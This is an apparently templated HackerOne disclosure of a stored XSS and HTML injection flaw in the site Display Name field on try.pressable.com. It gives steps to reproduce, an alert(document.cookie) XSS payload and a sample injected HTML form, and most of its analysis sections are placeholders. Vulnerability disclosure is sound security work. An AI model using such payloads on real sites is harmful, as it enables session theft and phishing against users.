#  Site information's Display Name section vulnerable for XSS attacks and HTML Injections.

## Metadata
- **Source:** HackerOne
- **Report:** 1554888 | https://hackerone.com/reports/1554888
- **Submitted:** 2022-04-29
- **Reporter:** sawrav-chowdhury
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** low
- **Vuln:** Cross-site Scripting (XSS) - Stored
- **CVEs:** None
- **Category:** web-api

## Summary
## Summary:

Hi, 

Greetings. I have found that site information's Display Name section on the try.pressable.com is vulnerable for potential  XSS attacks and HTML Injections.

## Steps To Reproduce:
1. Visit https://try.pressable.com
2. Create a new site.
3. On the  Display Name section, put the XSS / HTML Injection payloads.
4. XSS will be triggered/ Injected HTML will be reflected.

XSS Payload:

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

## Summary:

Hi, 

Greetings. I have found that site information's Display Name section on the try.pressable.com is vulnerable for potential  XSS attacks and HTML Injections.

## Steps To Reproduce:
1. Visit https://try.pressable.com
2. Create a new site.
3. On the  Display Name section, put the XSS / HTML Injection payloads.
4. XSS will be triggered/ Injected HTML will be reflected.

XSS Payload:  "><img src=x onerror=javascript:alert(document.cookie)>

HTML Payload: 
<form action="/action_page.php">
<label for="fname">First name:</label>
<input type="text" id="fname" name="fname"><br><br>
<label for="lname">Last name:</label>
<input type="text" id="lname" name="lname"><br><br>
<input type="submit" value="Submit">
</form>

## Supporting Material/References:
POC Video attached

## Impact

Due to these vulnerabilities, attacker can easily divert victims to their malicious site and able to get credentials of victims.

</details>

---
*Analysed by Claude on 2026-05-24*
